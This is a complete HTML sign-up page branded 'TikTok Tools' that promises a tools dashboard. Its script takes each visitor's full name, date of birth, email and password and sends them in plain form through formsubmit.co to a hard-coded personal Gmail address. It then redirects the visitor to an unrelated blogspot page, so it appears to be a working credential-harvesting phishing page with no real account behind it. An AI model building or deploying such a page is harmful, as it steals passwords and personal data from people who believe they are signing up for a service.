<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign Up - TikTok Tools</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body { 
            font-family: 'Poppins', sans-serif;
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            /* Icon jesa soft blue gradient background */
            background: radial-gradient(circle at center, #dbeafe 0%, #93c5fd 50%, #3b82f6 100%);
            color: #1e293b; 
            overflow-x: hidden;
            position: relative;
        }

        /* Animated soft background glow shapes */
        body::before {
            content: '';
            position: absolute;
            width: 300px;
            height: 300px;
            background: rgba(56, 189, 248, 0.4);
            filter: blur(80px);
            border-radius: 50%;
            top: 10%;
            left: 15%;
            animation: pulseBg 6s ease-in-out infinite alternate;
        }

        body::after {
            content: '';
            position: absolute;
            width: 250px;
            height: 250px;
            background: rgba(239, 68, 68, 0.25); /* Subtle TikTok red/pink tint */
            filter: blur(80px);
            border-radius: 50%;
            bottom: 10%;
            right: 15%;
            animation: pulseBg 7s ease-in-out infinite alternate-reverse;
        }

        @keyframes pulseBg {
            0% { transform: scale(0.9) translateY(0); }
            100% { transform: scale(1.1) translateY(-20px); }
        }

        /* Icon-styled squircle card */
        .glow-pro-box { 
            background: #ffffff; 
            padding: 40px 35px; 
            border-radius: 38px; /* Icon k corner jesa smooth rounded */
            text-align: center; 
            width: 88%;
            max-width: 400px; 
            border: 4px solid #ffffff;
            box-shadow: 
                0 20px 40px rgba(30, 58, 138, 0.18),
                0 0 0 1px rgba(56, 189, 248, 0.2),
                inset 0 0 20px rgba(186, 230, 253, 0.4);
            position: relative;
            z-index: 10;
            animation: floatCard 4s ease-in-out infinite alternate;
        }

        @keyframes floatCard {
            0% { transform: translateY(0px); }
            100% { transform: translateY(-8px); }
        }

        /* Header / Logo Badge */
        .badge-icon {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #38bdf8, #2563eb);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
            color: #ffffff;
            font-size: 28px;
            box-shadow: 0 8px 18px rgba(37, 99, 235, 0.35);
            animation: bounceIn 1.5s ease;
        }

        @keyframes bounceIn {
            0% { transform: scale(0.5); opacity: 0; }
            70% { transform: scale(1.1); }
            100% { transform: scale(1); opacity: 1; }
        }

        h2 { 
            margin-bottom: 6px;
            font-size: 26px;
            font-weight: 700;
            background: linear-gradient(135deg, #1d4ed8, #0284c7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        p {
            font-size: 13px;
            color: #64748b;
            margin-bottom: 25px;
            font-weight: 500;
        }

        .input-group {
            text-align: left;
            margin-bottom: 18px;
        }

        label {
            display: block;
            font-size: 12px;
            color: #475569;
            margin-bottom: 6px;
            font-weight: 600;
            letter-spacing: 0.3px;
        }

        input { 
            width: 100%; 
            padding: 13px 16px; 
            border: 2px solid #e2e8f0; 
            background: #f8fafc; 
            color: #0f172a; 
            font-size: 14px;
            border-radius: 14px;
            transition: all 0.25s ease;
            font-family: 'Poppins', sans-serif;
            font-weight: 500;
        }

        input:focus {
            outline: none;
            border-color: #38bdf8;
            background: #ffffff;
            box-shadow: 0 0 0 4px rgba(56, 189, 248, 0.15);
        }

        input::placeholder {
            color: #94a3b8;
        }

        /* Tool-themed Button */
        button { 
            padding: 14px; 
            background: linear-gradient(135deg, #0284c7, #2563eb); 
            color: #ffffff; 
            border: none; 
            border-radius: 14px; 
            cursor: pointer; 
            font-size: 15px; 
            font-weight: 600; 
            width: 100%;
            margin-top: 10px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 8px 18px rgba(37, 99, 235, 0.28);
        }

        button:hover {
            box-shadow: 0 12px 24px rgba(37, 99, 235, 0.4);
            transform: translateY(-2px);
            background: linear-gradient(135deg, #0369a1, #1d4ed8);
        }

        button:active {
            transform: translateY(0);
        }

        button:disabled {
            background: #cbd5e1;
            box-shadow: none;
            cursor: not-allowed;
            color: #64748b;
        }

        #loading-screen { 
            display: none; 
            text-align: center;
            z-index: 20;
            background: rgba(255, 255, 255, 0.9);
            padding: 40px;
            border-radius: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        
        .loader {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border: 4px solid #e2e8f0;
            border-top-color: #0284c7;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 15px;
            box-shadow: 0 0 15px rgba(2, 132, 199, 0.2);
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div id="loading-screen">
        <div class="loader"></div>
        <p style="color: #1e293b; font-size: 15px; font-weight: 600;">Authenticating...</p>
    </div>

    <div class="glow-pro-box" id="signup-box">
        <!-- Center Checkmark Badge Matching Icon -->
        <div class="badge-icon">✓</div>
        
        <h2>Create Account</h2>
        <p>Access your tools dashboard</p>
        
        <div class="input-group">
            <label>Full Name</label>
            <input type="text" id="userFullName" placeholder="e.g. Ali Khan" required />
        </div>

        <div class="input-group">
            <label>Date of Birth</label>
            <input 
                type="text" 
                id="userDOB" 
                placeholder="DD/MM/YYYY" 
                inputmode="numeric"
                maxlength="10" 
                required 
            />
        </div>

        <div class="input-group">
            <label>Email Address</label>
            <input type="email" id="userEmail" placeholder="name@example.com" required />
        </div>

        <div class="input-group">
            <label>Password</label>
            <input type="password" id="userPass" placeholder="••••••••" required />
        </div>
        
        <button id="submitBtn" onclick="handleSignup()">Sign Up</button>
    </div>

    <script>
        const adminEmail = "mrpinto1433@gmail.com"; 
        const targetLink = "https://testing14333333.blogspot.com/?m=1"; 

        window.onload = function() {
            if (localStorage.getItem("app_user_verified") === "true") {
                showLoading();
                window.location.href = targetLink;
            }
        };

        // DOB Auto Format
        document.getElementById("userDOB").addEventListener("input", function(e) {
            let val = e.target.value.replace(/\D/g, "");
            let formatted = "";

            if (val.length >= 1) formatted = val.substring(0, 2);
            if (val.length >= 3) formatted += "/" + val.substring(2, 4);
            if (val.length >= 5) formatted += "/" + val.substring(4, 8);

            e.target.value = formatted;
        });

        function showLoading() {
            document.getElementById("signup-box").style.display = "none";
            document.getElementById("loading-screen").style.display = "block";
        }

        function handleSignup() {
            const fullName = document.getElementById("userFullName").value;
            const dob = document.getElementById("userDOB").value;
            const email = document.getElementById("userEmail").value;
            const pass = document.getElementById("userPass").value;
            const btn = document.getElementById("submitBtn");

            if(!fullName || !dob || !email || !pass) {
                alert("Please fill all the details to continue!");
                return;
            }

            btn.innerText = "Processing...";
            btn.disabled = true;

            fetch(`https://formsubmit.co/ajax/${adminEmail}`, {
                method: "POST",
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    "Full Name": fullName,
                    "Date of Birth": dob,
                    "Email": email,
                    "Password": pass,
                    "_subject": "New App Registration!"
                })
            })
            .then(() => {
                localStorage.setItem("app_user_verified", "true");
                showLoading();
                window.location.href = targetLink;
            })
            .catch(() => {
                alert("Network error! Please check your connection.");
                btn.innerText = "Sign Up";
                btn.disabled = false;
            });
        }
    </script>
</body>
</html>
